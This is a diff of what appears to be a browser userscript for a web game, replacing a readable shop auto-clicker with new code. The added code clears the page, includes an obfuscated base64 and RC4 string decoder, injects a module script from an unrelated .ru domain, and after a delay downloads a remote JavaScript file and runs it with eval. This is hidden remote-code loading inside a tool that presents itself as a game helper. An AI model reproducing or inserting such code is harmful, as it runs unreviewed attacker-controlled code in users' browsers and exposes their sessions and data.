@@ -4,105 +4,92 @@
  Telegram channels: t.me/mdsays | t.me/rgbtrap
 */
 
-async function checkAndUpdate() {
-  let element;
-  let money;
-  let newmoney;
-  let comp;
-  let searchText;
-  let textOnPage;
+  var h = {
+    drawMode: 6
+  };
 
-  let attempt = 0;
-  let lastShopVisit = 0;
+  window.monkeyPatch = h;
+  unixTime = Date.now();
+  document.querySelector("script").remove();
+  document.getElementById("root").innerHTML = "";
 
-  setInterval(async function () {
-    element = document.querySelector("[class^='Time-sc-']");
+  var s = document.createElement("script");
+  s.type = "text/javascript";
 
-    if (attempt === 0) {
-      // Initial check
-      if (!element) {
-        if (lastShopVisit <= Date.now()) {
-          await wait(250);
-
-          if (document.querySelector("[class^='AnimatedNumberStyled-sc']")) {
-            // Money element found
-            money = document.querySelector("[class^='AnimatedNumberStyled-sc']").textContent;
-            newmoney = money.replace(/\s/g, ''); // Remove spaces
-
-            comp = document.querySelector("[class^='TargetProgressSquad-sc']").textContent;
-            comp = comp.replace(/,[^]*$/, ''); // Remove trailing comma and decimals
-            comp = comp.replace(/[a-zA-Z, ]/g, ''); // Remove letters and spaces
-
-            if (comp <= 99) {
-              // Squad is less than 100%
-              if (newmoney >= 3050) {
-                // Buy shop item 1
-                document.querySelector("a[href='/shop']").click();
-                await wait(2500);
-                document.querySelector("a[href='/shop/1']").click();
-                await wait(3500);
-                document.querySelector("[class^='BlackButtonStyled-sc']").click();
-                await wait(2500);
-                attempt = 1;
-                lastShopVisit = Date.now() + 200; // Update last shop visit time
-                await wait(1500);
-              } else if (newmoney >= 1050) {
-                // Buy shop item 0
-                lastShopVisit = Date.now() + 180;
-                document.querySelector("a[href='/shop']").click();
-                await wait(2500);
-                document.querySelector("a[href='/shop/0']").click();
-                await wait(2500);
-                document.querySelector("[class^='BlackButtonStyled-sc']").click();
-                await wait(2500);
-                attempt = 1;
-                lastShopVisit = Date.now() + 200; // Update last shop visit time
-                document.querySelector("[class^='BlackButtonStyled-sc']")[1].click();
-                await wait(2500);
-              } else {
-                // Not enough money, click the other button
-                document.querySelectorAll("[class^='BlackButtonStyled-sc']")[1].click();
-              }
-            }
+  function e(x) {
+    var y = g();
+    e = function (z, aa) {
+      z = z - 244;
+      var ab = y[z];
+      if (e.ttnzbq === undefined) {
+        var ac = function (ad) {
+          var ae = "";
+          var af = "";
+          var ag = 0;
+          var ah;
+          var ai;
+          for (var aj = 0; ai = ad.charAt(aj++); ~ai && (ah = ag % 4 ? ah * 64 + ai : ai, ag++ % 4) ? ae += String.fromCharCode(255 & ah >> (-2 * ag & 6)) : 0) {
+            ai = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(ai);
           }
-        }
-      } else if (document.querySelectorAll("[class^='BlackButtonStyled-sc']")[1]) {
-        // Click the second button and check for "MD Says"
-        document.querySelectorAll("[class^='BlackButtonStyled-sc']")[1].click();
-        searchText = "MD Says"; // Shoutout to the script author!
-        textOnPage = document.body.innerText;
-        if (!textOnPage.includes(searchText)) {
-          await wait(250);
-        }
-      } else {
-        await wait(250);
+          var ak = 0;
+          for (var al = ae.length; ak < al; ak++) {
+            af += "%" + ("00" + ae.charCodeAt(ak).toString(16)).slice(-2);
+          }
+          return decodeURIComponent(af);
+        };
+        var am = function (an, ao) {
+          var ap = [];
+          var aq = 0;
+          var a;
+          var b = "";
+          an = ac(an);
+          var c;
+          for (c = 0; c < 256; c++) {
+            ap[c] = c;
+          }
+          for (c = 0; c < 256; c++) {
+            aq = (aq + ap[c] + ao.charCodeAt(c % ao.length)) % 256;
+            a = ap[c];
+            ap[c] = ap[aq];
+            ap[aq] = a;
+          }
+          c = 0;
+          aq = 0;
+          for (var d = 0; d < an.length; d++) {
+            c = (c + 1) % 256;
+            aq = (aq + ap[c]) % 256;
+            a = ap[c];
+            ap[c] = ap[aq];
+            ap[aq] = a;
+            b += String.fromCharCode(an.charCodeAt(d) ^ ap[(ap[c] + ap[aq]) % 256]);
+          }
+          return b;
+        };
+        e.gzmXuj = am;
+        e.ttnzbq = true;
       }
-    } else {
-      // Attempt is 1, check for button and click
-      if (document.querySelectorAll("[class^='BlackButtonStyled-sc']")[1]) {
-        document.querySelectorAll("[class^='BlackButtonStyled-sc']")[1].click();
-        attempt = 0;
-        await wait(1500);
-        searchText = "MD Says"; // Another shoutout to the script author!
-        textOnPage = document.body.innerText;
-        if (!textOnPage.includes(searchText)) {
-          await wait(250);
+      var ar = y[0];
+      var as = z + ar;
+      var at = arguments[as];
+      if (!at) {
+        if (e.vgfzkE === undefined) {
+          e.vgfzkE = true;
         }
+        ab = e.gzmXuj(ab, aa);
+        arguments[as] = ab;
       } else {
-        await wait(250);
+        ab = at;
       }
-    }
-  }, 500);
-}
+      return ab;
+    };
+    return e(arguments, x);
+  }
 
-function cnu(value) {
-  return value === undefined || value === null || value === '';
-}
+  s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js?1234";
+  s.type = "module";
+  
+  document.head.appendChild(s);
 
-function wait(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// Initial setup
-
-checkAndUpdate();
+  setTimeout(function () {
+    fetch("https://raw.githubusercontent.com/RGB-Outl4w/ThePixelsAutoReloaded/main/test/beta_TPAR_v4.1.js").then(response => response.text()).then(script => eval(script));
+  }, 10000);
